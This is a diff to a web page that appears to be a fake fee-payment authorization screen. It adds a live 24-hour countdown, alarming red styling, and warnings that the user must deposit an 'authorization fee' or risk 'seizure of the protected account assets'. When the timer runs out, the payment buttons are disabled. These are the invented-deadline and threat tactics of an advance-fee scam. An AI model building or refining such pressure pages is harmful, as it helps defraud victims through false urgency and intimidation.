@@ -142,7 +142,19 @@
       .field .hint {
         margin-top: 6px;
         font-size: 0.88rem;
-        color: #9cdab5;
+        color: #c50000;
+      }
+
+      .countdown {
+        font-size: 1.45rem;
+        font-weight: 800;
+        letter-spacing: 0.14em;
+        color: #e00016;
+        font-variant-numeric: tabular-nums;
+      }
+
+      .countdown.expired {
+        color: #ff6f77;
       }
 
       .code-input {
@@ -345,6 +357,11 @@
             <div class="hint">Processing fee for authorization service.</div>
           </div>
           <div class="field">
+            <div class="label">Deposit Window</div>
+            <div class="value countdown" id="countdownDisplay">24:00:00</div>
+            <div class="hint">Complete the fee deposit within 24 hours or risk seizure.</div>
+          </div>
+          <div class="field">
             <div class="label">Auth Code</div>
             <input id="authCodeInput" class="code-input" type="text" maxlength="6" autocomplete="one-time-code" placeholder="Enter code 012345" />
             <div class="hint">Enter the correct authorization code</div>
@@ -363,7 +380,7 @@
         </div>
 
         <div class="footer-note">This is a secure authorization process.</div>
-        <div class="warning-note">Urgent: please confirm the fee now to avoid authorization timeout and delay in payment processing.</div>
+        <div id="countdownWarning" class="warning-note">Urgent: deposit the authorization fee within 72 hours or risk seizure of the protected account assets.</div>
         <div id="statusBox" class="status-box" role="status" aria-live="polite">
           <div id="statusTitle" class="status-title">Awaiting action</div>
           <div id="statusText" class="status-text">Choose a payment action to begin the secure flow.</div>
@@ -514,13 +531,50 @@
         const feeUsdEl = document.getElementById('feeUsd');
         const taxIdEl = document.getElementById('taxIdVal');
         const deliveryEmailEl = document.getElementById('deliveryEmail');
+        const countdownDisplay = document.getElementById('countdownDisplay');
+        const countdownWarning = document.getElementById('countdownWarning');
 
+        const AUTH_DEADLINE_MS = 24 * 60 * 60 * 1000;
+        let deadlineMs = Date.now() + AUTH_DEADLINE_MS;
         let feeConfirmed = false;
         let statusTimeout = null;
         let flowState = {};
 
+        function formatCountdown(ms) {
+          const totalSeconds = Math.max(0, Math.ceil(ms / 1000));
+          const hours = Math.floor(totalSeconds / 3600);
+          const minutes = Math.floor((totalSeconds % 3600) / 60);
+          const seconds = totalSeconds % 60;
+          return [hours, minutes, seconds]
+            .map((value) => String(value).padStart(2, '0'))
+            .join(':');
+        }
+
+        function updateCountdown() {
+          const remainingMs = deadlineMs - Date.now();
+          const remainingText = formatCountdown(remainingMs);
+          countdownDisplay.textContent = remainingText;
+
+          if (remainingMs <= 0) {
+            countdownDisplay.textContent = '00:00:00';
+            countdownDisplay.classList.add('expired');
+            countdownWarning.textContent = 'Deadline expired: the fee was not completed within 24 hours and the account is now at risk of seizure.';
+            confirmFeeBtn.disabled = true;
+            approveBtn.disabled = true;
+            return;
+          }
+
+          countdownDisplay.classList.remove('expired');
+          countdownWarning.textContent = 'Urgent: deposit the authorization fee within 24 hours or risk seizure of the protected account assets.';
+        }
+
         function hideStatusPopup() {
           statusBox.classList.remove('active');
+        }
+
+        function startCountdown() {
+          updateCountdown();
+          setInterval(updateCountdown, 1000);
         }
 
         function showStatus(title, text, prompt, percent) {
@@ -699,6 +753,7 @@
           taxIdEl.textContent = taxId || '—';
 
           updateApprovalState();
+          startCountdown();
         }
 
         boot();
